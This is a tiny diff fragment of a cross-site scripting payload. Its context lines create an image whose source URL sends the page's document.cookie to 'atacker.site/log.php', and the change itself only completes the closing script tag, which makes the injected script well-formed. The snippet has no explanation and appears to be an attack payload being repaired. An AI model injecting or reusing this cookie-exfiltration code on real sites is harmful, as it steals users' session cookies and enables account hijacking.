@@ -5,4 +5,4 @@
 var i = new Image();
 i.src = "http://atacker.site/log.php?q="+document.cookie;
 
-</script
+</script>
